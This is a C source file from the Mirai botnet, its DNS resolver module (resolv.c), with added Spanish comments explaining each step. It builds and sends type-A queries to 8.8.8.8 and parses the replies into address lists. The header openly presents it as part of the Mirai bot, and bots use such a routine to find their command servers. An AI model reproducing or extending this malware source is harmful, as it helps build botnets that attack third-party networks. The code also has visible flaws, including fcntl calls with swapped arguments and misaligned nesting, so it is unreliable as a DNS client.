/**
 * @file resolv.c
 * @brief Implementación del resolvedor de DNS para el bot Mirai
 * 
 * Este archivo contiene las funciones necesarias para realizar consultas DNS
 * y resolver nombres de dominio a direcciones IP. Implementa un cliente DNS
 * básico que puede realizar consultas tipo A (IPv4) usando UDP.
 */

#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

/**
 * @brief Convierte un nombre de dominio en formato DNS (formato de etiquetas)
 * 
 * Esta función toma un nombre de dominio en formato legible (ejemplo.com) y lo convierte
 * al formato de etiquetas usado en el protocolo DNS, donde cada etiqueta está precedida
 * por su longitud. Por ejemplo: "ejemplo.com" se convierte en "\6ejemplo\3com\0"
 * 
 * @param dst_hostname Puntero al buffer donde se almacenará el nombre convertido
 * @param src_domain Cadena que contiene el nombre de dominio a convertir
 */
void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    /* Calcular la longitud total incluyendo el terminador nulo */
    int len = util_strlen(src_domain) + 1;
    /* lbl apunta al byte de longitud actual, dst_pos al siguiente caracter a escribir */
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    /* Contador para la longitud de la etiqueta actual */
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

/**
 * @brief Salta sobre un nombre comprimido en un mensaje DNS
 * 
 * Esta función auxiliar maneja la compresión de nombres DNS, donde un nombre puede
 * contener punteros a otras partes del mensaje para ahorrar espacio. La función
 * avanza el puntero de lectura sobre el nombre, manejando tanto nombres normales
 * como comprimidos.
 * 
 * @param reader Puntero al inicio del nombre en el mensaje DNS
 * @param buffer Puntero al inicio del mensaje DNS completo
 * @param count Puntero donde se almacenará el número de bytes procesados
 */
static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    /* jumped indica si se ha encontrado un puntero de compresión */
    unsigned int jumped = 0, offset;
    /* Inicializar el contador de bytes procesados */
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

/**
 * @brief Resuelve un nombre de dominio a direcciones IPv4
 * 
 * Esta función implementa un cliente DNS simplificado que realiza consultas tipo A
 * para obtener las direcciones IPv4 asociadas a un nombre de dominio. Utiliza el
 * servidor DNS de Google (8.8.8.8) y realiza hasta 5 intentos de consulta.
 * 
 * El proceso incluye:
 * 1. Preparar y enviar una consulta DNS
 * 2. Esperar la respuesta con un timeout de 5 segundos
 * 3. Procesar la respuesta y extraer las direcciones IP
 * 
 * @param domain Nombre de dominio a resolver
 * @return Puntero a estructura resolv_entries con las IPs encontradas, o NULL si falla
 */
struct resolv_entries *resolv_lookup(char *domain)
{
    /* Asignar memoria para la estructura de resultados */
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    /* Estructura para la dirección del servidor DNS */
    struct sockaddr_in addr = {0};
    /* Calcular la longitud total de la consulta DNS */
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    /* Variables de control para intentos y socket */
    int tries = 0, fd = -1, i = 0;
    /* Generar un ID aleatorio para la consulta DNS */
    uint16_t dns_id = rand_next() % 0xffff;

    /* Inicializar la estructura de dirección del servidor DNS */
    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    /* Usar el servidor DNS público de Google (8.8.8.8) */
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    /* Puerto DNS estándar (53) */
    addr.sin_port = htons(53);

    /* Configurar la cabecera de la consulta DNS */
    dnsh->id = dns_id;                           /* Establecer el ID aleatorio generado */
    dnsh->opts = htons(1 << 8);                  /* Activar el flag de recursión deseada */
    dnsh->qdcount = htons(1);                    /* Indicar que enviamos una consulta */
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);      /* Solicitar registros tipo A (IPv4) */
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);   /* Clase de consulta para Internet */

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

            /* Verificar si la respuesta es un registro A de IPv4 */
            if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
            {
                /* Verificar que el tamaño de los datos sea 4 bytes (IPv4) */
                if (ntohs(r_data->data_len) == 4)
                {
                    uint32_t *p;
                    /* Buffer temporal para almacenar la dirección IP */
                    uint8_t tmp_buf[4];
                    /* Copiar los 4 bytes de la dirección IP */
                    for(i = 0; i < 4; i++)
                        tmp_buf[i] = name[i];                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

/**
 * @brief Libera la memoria asignada a una estructura resolv_entries
 * 
 * Esta función se encarga de liberar correctamente toda la memoria asignada
 * dinámicamente para una estructura resolv_entries, incluyendo el array de
 * direcciones IP y la estructura en sí.
 * 
 * @param entries Puntero a la estructura resolv_entries a liberar
 */
void resolv_entries_free(struct resolv_entries *entries)
{
    /* Verificar si el puntero es válido */
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
